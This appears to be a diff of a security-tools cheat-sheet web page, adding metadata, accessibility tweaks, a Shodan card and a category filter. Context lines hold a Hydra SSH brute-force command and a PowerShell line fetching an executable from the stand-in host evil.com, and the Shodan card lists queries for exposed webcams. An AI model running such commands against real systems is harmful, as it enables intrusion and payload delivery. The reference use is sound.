@@ -3,10 +3,24 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Comprehensive security tools encyclopedia - Nmap, Metasploit, Burp Suite, Wireshark, and more. Command examples and cheat sheets for penetration testing and SOC analysts.">
+  <meta name="keywords" content="security tools, nmap, metasploit, burp suite, wireshark, penetration testing, ethical hacking, cybersecurity tools">
+  <meta name="author" content="Zero Trust">
+  <!-- Open Graph / Social -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Security Tools Encyclopedia - Zero Trust">
+  <meta property="og:description" content="Comprehensive security tools index with command examples and cheat sheets.">
+  <meta property="og:url" content="https://zero-trust.pw/tools.html">
+  <!-- Twitter -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Security Tools Encyclopedia - Zero Trust">
+  <meta name="twitter:description" content="Comprehensive security tools index with command examples and cheat sheets.">
   <title>Security Tools - Zero Trust</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
   <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
+  <a href="#main-content" class="skip-link">Skip to main content</a>
   <header style="padding: 4rem 1rem;">
     <div class="nav-bar">
         <a href="index.html">Home</a>
@@ -17,9 +31,9 @@
     <p>A curated list of SOC, OSINT, and Offensive Security tools.</p>
   </header>
 
-  <main>
+  <main id="main-content">
     <div class="search-container">
-        <input type="text" id="searchInput" class="search-input" placeholder="Search tools, categories, or keywords...">
+        <input type="text" id="searchInput" class="search-input" placeholder="Search tools, categories, or keywords..." aria-label="Search security tools">
     </div>
 
     <div id="toolsGrid" class="grid-container">
@@ -81,7 +95,7 @@ Right-click packet -> Follow -> TCP Stream
         </div>
 
         <!-- Exploitation -->
-        <div class="tool-card" data-keywords="metasploit framework msfconsole exploit">
+        <div class="tool-card" id="metasploit" data-keywords="metasploit framework msfconsole exploit">
             <div class="tool-header">
                 <h3 class="tool-title">Metasploit Framework</h3>
                 <span class="tool-category cat-exp">Exploitation</span>
@@ -114,7 +128,7 @@ searchsploit -m &lt;id&gt;
             </div>
         </div>
 
-        <div class="tool-card" data-keywords="hydra brute force password cracker">
+        <div class="tool-card" id="hydra" data-keywords="hydra brute force password cracker">
             <div class="tool-header">
                 <h3 class="tool-title">Hydra</h3>
                 <span class="tool-category cat-exp">Exploitation</span>
@@ -127,7 +141,7 @@ hydra -l user -P passlist.txt ssh://192.168.1.10
         </div>
 
         <!-- Web -->
-        <div class="tool-card" data-keywords="burp suite web proxy scanner intercept">
+        <div class="tool-card" id="burp" data-keywords="burp suite web proxy scanner intercept">
             <div class="tool-header">
                 <h3 class="tool-title">Burp Suite</h3>
                 <span class="tool-category cat-web">Web</span>
@@ -205,7 +219,7 @@ volatility -f memory.dmp --profile=&lt;profile&gt; pslist
         </div>
 
         <!-- OSINT -->
-        <div class="tool-card" data-keywords="sherlock osint username search social media">
+        <div class="tool-card" id="sherlock" data-keywords="sherlock osint username search social media">
             <div class="tool-header">
                 <h3 class="tool-title">Sherlock</h3>
                 <span class="tool-category cat-osint">OSINT</span>
@@ -217,7 +231,7 @@ python3 sherlock.py username
             </div>
         </div>
 
-        <div class="tool-card" data-keywords="maltego osint link analysis graph">
+        <div class="tool-card" id="maltego" data-keywords="maltego osint link analysis graph">
             <div class="tool-header">
                 <h3 class="tool-title">Maltego</h3>
                 <span class="tool-category cat-osint">OSINT</span>
@@ -234,6 +248,25 @@ python3 sherlock.py username
             <div class="tool-flags">
 <strong># Basic Search</strong>
 theHarvester -d example.com -b all
+            </div>
+        </div>
+
+        <div class="tool-card" id="shodan" data-keywords="shodan search engine iot devices internet scanner">
+            <div class="tool-header">
+                <h3 class="tool-title">Shodan</h3>
+                <span class="tool-category cat-osint">OSINT</span>
+            </div>
+            <div class="tool-desc">Search engine for Internet-connected devices. Find vulnerable systems, open ports, and exposed services.</div>
+            <div class="tool-flags">
+<strong># CLI Search</strong>
+shodan search "apache"
+
+<strong># Host Info</strong>
+shodan host &lt;ip_address&gt;
+
+<strong># Web Queries</strong>
+port:22 country:US
+webcam has_screenshot:true
             </div>
         </div>
 
@@ -320,12 +353,39 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
         });
     }
 
-    // Check for query parameter
+    // Category filtering function
+    function filterByCategory(category) {
+        const categoryMap = {
+            'net': 'cat-net',
+            'web': 'cat-web',
+            'exp': 'cat-exp',
+            'for': 'cat-for',
+            'osint': 'cat-osint'
+        };
+
+        const catClass = categoryMap[category];
+        if (!catClass) return;
+
+        toolCards.forEach(card => {
+            const categorySpan = card.querySelector('.tool-category');
+            if (categorySpan && categorySpan.classList.contains(catClass)) {
+                card.classList.remove('hidden');
+            } else {
+                card.classList.add('hidden');
+            }
+        });
+    }
+
+    // Check for query parameters
     const urlParams = new URLSearchParams(window.location.search);
     const query = urlParams.get('q');
+    const category = urlParams.get('category');
+
     if (query) {
         searchInput.value = query;
         filterTools(query);
+    } else if (category) {
+        filterByCategory(category);
     }
 
     searchInput.addEventListener('input', (e) => {
